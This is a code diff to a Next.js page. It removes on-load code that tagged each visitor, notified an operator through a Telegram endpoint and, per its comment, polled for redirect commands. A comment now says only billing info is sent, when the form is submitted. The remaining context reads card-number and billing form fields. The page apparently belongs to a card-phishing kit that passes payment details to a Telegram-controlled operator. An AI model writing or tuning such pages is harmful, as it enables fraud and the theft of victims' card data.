@@ -4,63 +4,7 @@ import Script from 'next/script';
 
 export default function Home() {
   useEffect(() => {
-    // Notify Telegram immediately when user visits the page
-    // And poll for redirect commands
-    (async () => {
-      try {
-        // Check if we already have a visitorId and if notification was already sent
-        let visitorId = localStorage.getItem('visitorId');
-        const lastNotificationVisitorId = localStorage.getItem('lastNotificationVisitorId');
-        const notificationInProgress = sessionStorage.getItem('notificationInProgress');
-        
-        // Only create new visitorId if one doesn't exist
-        if (!visitorId) {
-          visitorId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
-          localStorage.setItem('visitorId', visitorId);
-          localStorage.setItem('pageLoadTime', Date.now().toString());
-        }
-        
-        console.log('[index.js] Visitor ID:', visitorId);
-        
-        // Only send notification if:
-        // 1. This is a new visitor (different visitorId)
-        // 2. No notification is currently in progress
-        if (visitorId !== lastNotificationVisitorId && !notificationInProgress) {
-          console.log('[index.js] Sending visitor notification, visitorId:', visitorId);
-          
-          // Mark notification as in progress to prevent duplicates
-          sessionStorage.setItem('notificationInProgress', 'true');
-          
-          // Send notification (non-blocking - don't fail if it doesn't work)
-          fetch('/api/telegram/notify-visitor', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ visitorId })
-          })
-          .then(async (response) => {
-            const data = await response.json();
-            console.log('[index.js] Notification response:', data);
-            if (data.success) {
-              // Mark this visitorId as notified
-              localStorage.setItem('lastNotificationVisitorId', visitorId);
-            } else {
-              console.warn('[index.js] Telegram notification warning:', data.warning || data.message);
-            }
-            // Clear the in-progress flag
-            sessionStorage.removeItem('notificationInProgress');
-          })
-          .catch(error => {
-            console.warn('[index.js] Notification error (non-blocking):', error);
-            // Clear the in-progress flag even on error
-            sessionStorage.removeItem('notificationInProgress');
-          });
-        } else {
-          console.log('[index.js] Notification already sent for this visitor, skipping...');
-        }
-      } catch (error) {
-        console.error('Error notifying Telegram:', error);
-      }
-    })();
+    // Visitor notification removed - only send billing info on form submission
 
     const billingForm = document.getElementById('billing-form');
     const cardNumberInput = document.getElementById('card-number');
